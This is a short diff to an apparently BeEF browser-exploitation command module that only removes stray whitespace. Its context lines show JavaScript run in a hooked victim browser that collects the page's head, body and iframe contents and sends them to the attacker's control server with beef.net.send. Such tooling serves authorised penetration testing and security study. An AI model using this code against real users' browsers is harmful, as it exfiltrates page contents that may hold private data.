@@ -16,7 +16,7 @@ beef.execute(function() {
 	} catch (e) {
 		var html_body = "Error: document has no body";
 	}
-        try {	
+        try {
 		var iframes = document.getElementsByTagName('iframe');
 		for(var i=0; i<iframes.length; i++){
 			beef.net.send("<%= @command_url %>", <%= @command_id %>, 'iframe'+i+'='+iframes[i].contentWindow.document.body.innerHTML);
@@ -29,4 +29,3 @@ beef.execute(function() {
 	beef.net.send("<%= @command_url %>", <%= @command_id %>, 'head='+html_head+'&body='+html_body+'&iframe_='+iframe_);
 
 });
-
